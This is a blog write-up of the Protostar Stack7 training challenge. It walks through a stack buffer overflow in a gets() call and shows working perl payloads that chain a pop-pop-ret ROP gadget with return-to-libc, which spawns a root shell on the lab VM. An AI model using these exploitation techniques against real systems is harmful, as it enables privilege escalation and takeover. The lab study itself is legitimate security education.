---
layout: post
title:  "Protostar Stack7 challenge"
date:   2018-05-04 10:05:36 +0530
categories: exploit-exercises protostar stack7
---
[Stack7][stack7-link] is the last challenge in the [Protostar][protostar-link] series of challenges.
The source code for this challenge is below
{% highlight cpp %}
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

char *getpath()
{
    char buffer[64];
    unsigned int ret;
    printf("input path please: "); fflush(stdout);
    gets(buffer);
    ret = __builtin_return_address(0);
    if((ret & 0xb0000000) == 0xb0000000) {
        printf("bzzzt (%p)\n", ret);
        _exit(1);
    }
    printf("got path %s\n", buffer);
    return strdup(buffer);
}
int main(int argc, char **argv)
{
    getpath();
}
{% endhighlight %}
We see there is a check for return address `ret` starting with `0xb`. If we remember from our attempt at solving [stack6][stack6-proto-link] the return address check has further been broadened from addresses starting with `0xbf` to `0xb`. This would mean that we cannot use `Return to libc` technique to solve this challenge. Since the libc `system` and `exit` calls had addresses starting with `0xb` we cannot use them in this challenge. This challenge description mentions using `return to .text`. A quick google search pointed to this being a sort of `return oriented programming` technique. Now it had been some time since I had studied about `ROP` so this [coursera-rop-video][courser-rop-video-link] was a nice refresher on basics of the technique.
I used `metasploit` to find the location of `gadgets` to be used for `ROP`. I copied the executable of stack7 to ubuntu machine where `metasploit` was installed for finding the address of gadgets.
{% highlight shell %}
VirtualBox:~$ msfelfscan --help
Usage: /opt/metasploit-framework/bin/../embedded/bin/msfelfscan [mode] <options> [targets]
Modes:
    -j, --jump [regA,regB,regC]      Search for jump equivalent instructions
    -p, --poppopret                  Search for pop+pop+ret combinations
    -r, --regex [regex]              Search for regex match
    -a, --analyze-address [address]  Display the code at the specified address
    -b, --analyze-offset [offset]    Display the code at the specified offset
Options:
    -A, --after [bytes]              Number of bytes to show after match (-a/-b)
    -B, --before [bytes]             Number of bytes to show before match (-a/-b)
    -D, --disasm                     Disassemble the bytes at this address
    -I, --image-base [address]       Specify an alternate ImageBase
    -h, --help                       Show this message
{% endhighlight %}
Since `poppopret` type gadgets were used in video tutorial link i tried to search executable for them.
{%h ighlight shell %}
VirtualBox:~$ msfelfscan -p stack7
[stack7]
0x08048492 pop ebx; pop ebp; ret
0x080485c7 pop edi; pop ebp; ret
0x080485f7 pop ebx; pop ebp; ret
{% endhighlight %}
So we have three poppopret gadgets available to us. Let us use first one at `0x08048492`. So our return address will be `0x08048492` this time. Since this gadget has two `pop` instructions, the next two values in payload will be popped to respective registers and next value will be our next return address.
So payload should look like `[junk uptil RET][RET=addr gadget-poppopret][pop1 val][pop2 val][next RET addr]`. Lets check if we're correct in `protostar` VM image.
{% highlight shell %}
user@protostar:~$ perl -e 'print "A"x80 . "\x92\x84\x04\x08" . "B"x4 . "C"x4 . "D"x4 . "E"x100 ' > payload
user@protostar:~$ gdb /opt/protostar/bin/stack7
(gdb) r < payload
Starting program: /opt/protostar/bin/stack7 < payload
input path please: got path AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA��AAAAAAAAAAAA��BBBBCCCCDDDDEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEE
Program received signal SIGSEGV, Segmentation fault.
0x44444444 in ?? ()
(gdb) info r
eax            0x804a008    134520840
ecx            0x0  0
edx            0x1  1
ebx            0x42424242   1111638594
esp            0xbffff7dc   0xbffff7dc
ebp            0x43434343   0x43434343
esi            0x0  0
edi            0x0  0
eip            0x44444444   0x44444444
eflags         0x210202 [ IF RF ID ]
cs             0x73 115
ss             0x7b 123
ds             0x7b 123
es             0x7b 123
fs             0x0  0
gs             0x33 51
(gdb) x/10s $esp
0xbffff7dc:  'E' <repeats 100 times>
0xbffff841:  ""
0xbffff842:  ""
0xbffff843:  ""
0xbffff844:  "\020b\377\267\233\333\352\267\364\357\377\267\001"
0xbffff852:  ""
0xbffff853:  ""
0xbffff854:  "\020\204\004\b"
0xbffff859:  ""
0xbffff85a:  ""
{% endhighlight %}
`info r` shows that `$ebx` register has been overwritten with B, `$ebp` has been with C and `$eip` the instruction pointer has been overwritten with DDDD ie `0x44444444`.
Since this value was used as return address we get a `SIGSEGV`.
Also `x/10s $esp` shows us that `$esp` now points to EEEE.... 
Now since we have passed the check for `RET` address we can user `ret-to-libc` technique further complete the exploit.
So we have space after second RET too. So if we want to implement this exploit using shellcode we can either put our shellcode where we have placed AAA or we can place it after second RET. Also we can try placing our shellcode in an enviromment variable and returning to it.
Repeating steps for [Stack6][stack6-my] we create an environemtn variable and get its address when running `stack7` and also get address of `system` and `exit` calls for `ret-to-libc`
{% highlight shell %}
user@protostar:~$ export EGG="/bin/sh"
user@protostar:~$ ./getenvaddr EGG /opt/protostar/bin/stack7
EGG will be at 0xbffffa02
user@protostar:~$ gdb /opt/protostar/bin/stack7 
(gdb) b main
Breakpoint 1 at 0x804854b: file stack7/stack7.c, line 28.
(gdb) r
Starting program: /opt/protostar/bin/stack7 
Breakpoint 1, main (argc=1, argv=0xbffff784) at stack7/stack7.c:28
28  stack7/stack7.c: No such file or directory.
    in stack7/stack7.c
(gdb) p system
$1 = {<text variable, no debug info>} 0xb7ecffb0 <__libc_system>
(gdb) p exit
$2 = {<text variable, no debug info>} 0xb7ec60c0 <*__GI_exit>
{% endhighlight %}
So now our payload shall look like `[junk uptil RET][RET=addr gadget-poppopret][pop1 val][pop2 val][system][exit][/bin/sh]`
Using perl to create payload combining `ROP` and `ret-to-libc` we are able to successfully spwan a shell
{% highlight shell %}
user@protostar:~$ perl -e 'print "A"x80 . "\x92\x84\x04\x08" . "B"x4 . "C"x4 ."\xb0\xff\xec\xb7" . "\xc0\x60\xec\xb7" . "\x02\xfa\xff\xbf"' > payload
user@protostar:~$ (cat payload; cat) | /opt/protostar/bin/stack7
input path please: 
got path AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA��AAAAAAAAAAAA��BBBBCCCC�����`�����
id
uid=1001(user) gid=1001(user) euid=0(root) groups=0(root),1001(user)
whoami
root
{% endhighlight %}
[stack7-link]:https://exploit-exercises.com/protostar/stack7/
[protostar-link]:https://exploit-exercises.com/protostar/
[stack6-proto-link]:https://exploit-exercises.com/protostar/stack6/
[courser-rop-video-link]:https://www.youtube.com/watch?v=XZa0Yu6i_ew
[stack6-my]: https://rawatm.github.io/security/protostar/2018/04/22/protostar-exploit-exercises-stack6/